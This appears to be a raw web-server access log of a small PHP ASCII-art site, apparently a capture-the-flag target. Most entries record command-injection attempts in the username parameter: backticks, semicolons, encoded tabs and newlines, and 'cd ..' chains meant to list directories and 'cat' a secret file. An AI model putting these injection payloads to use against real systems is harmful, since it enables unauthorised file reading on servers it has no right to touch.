58.187.43.105 - - [28/Aug/2022:07:11:36 +0000] "GET /index.php?username=cd+..+cd+..+cd+..&type=gnu HTTP/1.1" 200 1284 "http://128.199.190.141:5551/index.php?username=cd+..+cd+..+cd+..&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
14.161.31.188 - - [28/Aug/2022:07:11:36 +0000] "GET /index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%60&type=figlet HTTP/1.1" 200 1353 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:11:37 +0000] "GET / HTTP/1.1" 200 1175 "-" "ZaloPC-win32-24v355"
58.187.43.105 - - [28/Aug/2022:07:11:38 +0000] "GET /index.php?username=%27%3Bls+%2F+%23%60%3Bcat%2509%2Fsecret_file%60+c%C5%A9ng+%C4%91%C6%B0%E1%BB%A3c&type=figlet HTTP/1.1" 200 1083 "http://128.199.190.141:5551/index.php?username=a&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63"
58.187.43.105 - - [28/Aug/2022:07:11:52 +0000] "GET /index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file.txt%60&type=figlet HTTP/1.1" 200 1384 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:11:53 +0000] "-" 408 0 "-" "-"
58.187.43.105 - - [28/Aug/2022:07:11:54 +0000] "-" 408 0 "-" "-"
58.187.43.105 - - [28/Aug/2022:07:11:58 +0000] "GET /index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%60&type=figlet HTTP/1.1" 200 1353 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:12:03 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet HTTP/1.1" 200 1139 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%250Asecret_file%2509&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
14.161.31.188 - - [28/Aug/2022:07:12:05 +0000] "GET /index.php?username=%3Bls+%2F+%23%3B%60cat%2509%2Fsecret_file%60+&type=figlet HTTP/1.1" 200 1309 "http://128.199.190.141:5551/index.php?username=%27%3Bls+%2F+%23%60%3Bcat%2509%2Fsecret_file%60+c%C5%A9ng+%C4%91%C6%B0%E1%BB%A3c&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63"
58.187.43.105 - - [28/Aug/2022:07:12:26 +0000] "GET /index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%60&type=figlet HTTP/1.1" 200 1353 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:12:28 +0000] "-" 408 0 "-" "-"
171.253.1.35 - - [28/Aug/2022:07:12:32 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=figlet HTTP/1.1" 200 1836 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
127.0.0.1 - - [28/Aug/2022:07:12:33 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) PHP/7.4.30 (internal dummy connection)"
171.253.1.35 - - [28/Aug/2022:07:12:44 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=figlet HTTP/1.1" 200 1836 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:07:12:54 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:12:57 +0000] "-" 408 0 "-" "-"
58.187.43.105 - - [28/Aug/2022:07:13:16 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=figlet HTTP/1.1" 200 1139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:07:13:17 +0000] "-" 408 0 "-" "-"
58.187.43.105 - - [28/Aug/2022:07:13:23 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als&type=random HTTP/1.1" 200 1186 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.84 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:13:24 +0000] "GET /style.css HTTP/1.1" 200 955 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.84 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:13:24 +0000] "GET /demo.png HTTP/1.1" 200 103050 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.84 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:13:24 +0000] "GET /favicon.ico HTTP/1.1" 404 495 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.84 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:13:26 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A HTTP/1.1" 200 1194 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:13:33 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet HTTP/1.1" 200 1139 "http://128.199.190.141:5551/index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%60&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
14.161.31.188 - - [28/Aug/2022:07:13:45 +0000] "GET /index.php?username=%3Bls+%2F+%23%3B%60cat%2509%2Fsecret_file%60&type=figlet HTTP/1.1" 200 1308 "http://128.199.190.141:5551/index.php?username=%3Bls+%2F+%23%3B%60cat%2509%2Fsecret_file%60+&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63"
14.161.31.188 - - [28/Aug/2022:07:13:49 +0000] "GET /index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09..%0Als%60&type=figlet HTTP/1.1" 200 1261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:13:54 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=figlet HTTP/1.1" 200 1139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:07:13:55 +0000] "GET /index.php?debug HTTP/1.1" 200 2637 "http://128.199.190.141:5551/index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
171.253.1.35 - - [28/Aug/2022:07:14:01 +0000] "GET /index.php?username=%601%60&type=random&debug HTTP/1.1" 200 2601 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:07:14:05 +0000] "GET /index.php?username=%3Bls+%2F+%23&type=figlet HTTP/1.1" 200 1180 "http://128.199.190.141:5551/index.php?username=%3Bls+%2F+%23%3B%60cat%2509%2Fsecret_file%60&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63"
14.161.31.188 - - [28/Aug/2022:07:14:14 +0000] "GET //index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=figlet HTTP/1.1" 200 1873 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.84 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:14:14 +0000] "GET //style.css HTTP/1.1" 200 955 "http://128.199.190.141:5551//index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.84 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:14:14 +0000] "GET //demo.png HTTP/1.1" 200 103050 "http://128.199.190.141:5551//index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.84 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:14:25 +0000] "-" 408 0 "-" "-"
58.187.43.105 - - [28/Aug/2022:07:14:26 +0000] "-" 408 0 "-" "-"
58.187.43.105 - - [28/Aug/2022:07:14:35 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=figlet HTTP/1.1" 200 1102 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:14:41 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:14:41 +0000] "GET /index.php?debug HTTP/1.1" 200 2638 "http://128.199.190.141:5551/index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:14:48 +0000] "GET /?debug=1 HTTP/1.1" 200 2638 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:14:51 +0000] "GET /index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09..%0Als%60&type=gnu HTTP/1.1" 200 1295 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:14:52 +0000] "GET / HTTP/1.1" 200 1235 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:14:56 +0000] "GET / HTTP/1.1" 200 1964 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:14:56 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:14:59 +0000] "GET /?debug HTTP/1.1" 200 2637 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:15:10 +0000] "GET /index.php?username=%27%3Bcat+%2Fsecret_file+%23%27%3Bls+%2F+%23&type=figlet HTTP/1.1" 200 1061 "http://128.199.190.141:5551/index.php?username=%3Bls+%2F+%23&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63"
14.161.31.188 - - [28/Aug/2022:07:15:11 +0000] "GET /index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%60&type=figlet HTTP/1.1" 200 1316 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:15:16 +0000] "GET /index.php?username=%27%3B+cat+%2F*+%23&type=eyes HTTP/1.1" 200 1044 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:15:22 +0000] "GET /index.php?debug HTTP/1.1" 200 2638 "http://128.199.190.141:5551/index.php?username=hi|%20ls&type=gnu" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:15:22 +0000] "GET /favicon.ico HTTP/1.1" 404 495 "http://128.199.190.141:5551/index.php?debug" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:15:40 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:15:43 +0000] "-" 408 0 "-" "-"
58.187.43.105 - - [28/Aug/2022:07:15:50 +0000] "GET /index.php?username=cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet HTTP/1.1" 200 1401 "http://128.199.190.141:5551/index.php?username=%26%26%3Bcat+%2F*+%23&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:15:58 +0000] "GET /index.php?username=%25&type=dragon HTTP/1.1" 200 1359 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:16:02 +0000] "-" 408 0 "-" "-"
58.187.43.105 - - [28/Aug/2022:07:16:05 +0000] "GET /index.php?username=%27%27%27%27ls%27%27&type=eyes HTTP/1.1" 200 1048 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:16:50 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:16:51 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als%2509&type=figlet HTTP/1.1" 200 1133 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36"
171.253.1.35 - - [28/Aug/2022:07:17:15 +0000] "GET /index.php?username=%601%60&type=random&debug HTTP/1.1" 200 2601 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
171.253.1.35 - - [28/Aug/2022:07:17:18 +0000] "GET /index.php?username=%601%60&type=random&debug HTTP/1.1" 200 2601 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:17:23 +0000] "GET /index.php?username=aaaa&type=figlet HTTP/1.1" 200 1189 "http://128.199.190.141:5551/index.php?username=%25&type=dragon" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:17:29 +0000] "GET /index.php HTTP/1.1" 200 1186 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
171.253.1.35 - - [28/Aug/2022:07:17:30 +0000] "GET / HTTP/1.1" 200 1216 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
171.253.1.35 - - [28/Aug/2022:07:17:30 +0000] "GET /style.css HTTP/1.1" 200 919 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
171.253.1.35 - - [28/Aug/2022:07:17:30 +0000] "GET /demo.png HTTP/1.1" 200 103014 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:17:34 +0000] "GET /index.php?debug HTTP/1.1" 200 2637 "http://128.199.190.141:5551/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
171.253.1.35 - - [28/Aug/2022:07:17:44 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=figlet HTTP/1.1" 200 1836 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
171.253.1.35 - - [28/Aug/2022:07:17:49 +0000] "GET / HTTP/1.1" 200 1288 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:17:54 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Als&type=figlet HTTP/1.1" 200 1021 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:18:14 +0000] "GET /index.php?username=%2560cd%2509..%250acd%2509..%250acd%2509..%250als%2509%252A%2560&type=figlet HTTP/1.1" 200 13848 "http://128.199.190.141:5551/index.php?username=%60%60&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
14.161.31.188 - - [28/Aug/2022:07:18:15 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:18:15 +0000] "GET /index.php?debug HTTP/1.1" 200 2638 "http://128.199.190.141:5551/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:18:29 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Als%0A&type=figlet HTTP/1.1" 200 1067 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:18:40 +0000] "GET /index.php?username=cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Als%09&type=figlet HTTP/1.1" 200 1315 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:18:51 +0000] "GET /?debug HTTP/1.1" 200 2638 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:20:23 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd&09..%0Als%0A&type=figlet HTTP/1.1" 200 1020 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:20:30 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Als%0A&type=figlet HTTP/1.1" 200 1123 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:20:33 +0000] "GET /index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=gnu HTTP/1.1" 200 1321 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
171.253.1.35 - - [28/Aug/2022:07:20:42 +0000] "GET /index.php?username=%601%60&type=random&debug HTTP/1.1" 200 2601 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:07:21:00 +0000] "GET /index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%0A&type=gnu HTTP/1.1" 200 1308 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:21:37 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet HTTP/1.1" 200 1139 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:21:52 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:21:52 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet HTTP/1.1" 200 1139 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:07:22:04 +0000] "GET / HTTP/1.1" 200 1358 "-" "ZaloPC-win32-24v355"
14.161.31.188 - - [28/Aug/2022:07:22:20 +0000] "GET /index.php?username=%21&type=random HTTP/1.1" 200 1186 "http://128.199.190.141:5551/index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%0A&type=gnu" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:22:29 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:22:42 +0000] "GET /index.php?username=%21%60cd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%0A&type=gnu HTTP/1.1" 200 1309 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:22:44 +0000] "-" 408 0 "-" "-"
58.187.43.105 - - [28/Aug/2022:07:22:56 +0000] "GET /index.php?username=%21%60cd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%0A&type=figlet HTTP/1.1" 200 1354 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:23:06 +0000] "GET /index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%0A&type=figlet HTTP/1.1" 200 1354 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:23:19 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=figlet HTTP/1.1" 200 1139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:23:22 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Avi%2509secret_file%250A&type=figlet HTTP/1.1" 200 1078 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:07:23:22 +0000] "GET /index.php?debug HTTP/1.1" 200 2638 "http://128.199.190.141:5551/index.php?username=hi|%20ls&type=gnu" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:07:23:22 +0000] "GET /favicon.ico HTTP/1.1" 404 496 "http://128.199.190.141:5551/index.php?debug" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:23:36 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Anc%2509secret_file%250A&type=figlet HTTP/1.1" 200 1078 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Avi%2509secret_file%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:07:23:38 +0000] "GET /index.php?username=&type=random HTTP/1.1" 200 1219 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Anc%2509secret_file%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:07:23:56 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Anl%2509secret_file%250A&type=figlet HTTP/1.1" 200 1145 "http://128.199.190.141:5551/index.php?username=&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
